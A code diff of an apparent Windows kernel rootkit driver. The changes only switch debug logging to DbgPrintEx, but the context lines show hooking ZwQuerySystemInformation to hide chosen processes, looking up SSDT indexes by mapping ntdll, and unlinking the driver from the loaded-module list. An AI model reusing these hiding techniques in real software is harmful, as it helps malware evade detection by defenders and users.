@@ -92,7 +92,7 @@ NTSTATUS newZwQuerySystemInformation(
 			//DbgPrint("ProcName:  %-20ws     pid:  %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
 			//判断是否为需要隐藏的进程名
 			if (shouldHide(cSPI)) {
-				DbgPrint("hide process %-20ws\n", (*cSPI).ProcessName.Buffer);
+				DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "hide process %-20ws，pid %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
 				//当前的进程不是第一个  第一个进程时pSPI是NULL
 				if (pSPI != NULL) {
 					//当前进程是最后一个
@@ -186,7 +186,7 @@ NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSe
 		FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
 	if (!NT_SUCCESS(status))
 	{
-		KdPrint(("ZwOpenFile Error! [error code: 0x%X]", status));
+		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwOpenFile Error! [error code: 0x%X]", status);
 		return status;
 	}
 	// 创建一个节对象, 以 PE 结构中的 SectionALignment 大小对齐映射文件
@@ -194,7 +194,7 @@ NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSe
 	if (!NT_SUCCESS(status))
 	{
 		ZwClose(hFile);
-		KdPrint(("ZwCreateSection Error! [error code: 0x%X]", status));
+		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwCreateSection Error! [error code: 0x%X]\n", status);
 		return status;
 	}
 	// 映射到内存
@@ -203,7 +203,7 @@ NTSTATUS DllFileMap(UNICODE_STRING ustrDllFileName, HANDLE* phFile, HANDLE* phSe
 	{
 		ZwClose(hSection);
 		ZwClose(hFile);
-		KdPrint(("ZwMapViewOfSection Error! [error code: 0x%X]", status));
+		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "ZwMapViewOfSection Error! [error code: 0x%X]\n", status);
 		return status;
 	}
 
@@ -264,7 +264,7 @@ ULONG GetSSDTFunctionIndex(UNICODE_STRING ustrDllFileName, PCHAR pszFunctionName
 	status = DllFileMap(ustrDllFileName, &hFile, &hSection, &pBaseAddress);
 	if (!NT_SUCCESS(status))
 	{
-		KdPrint(("DllFileMap Error!\n"));
+		DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "DllFileMap Error!\n");
 		return ulFunctionIndex;
 	}
 
@@ -347,7 +347,7 @@ void HideDriver(IN PDRIVER_OBJECT DriverObject) {
 	//自循环
 	cur_section->InLoadOrderLinks.Flink = (PLIST_ENTRY)cur_section;
 	cur_section->InLoadOrderLinks.Blink = (PLIST_ENTRY)cur_section;
-
+	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "hide driver .\n");
 	KeLowerIrql(irql);
 }
 
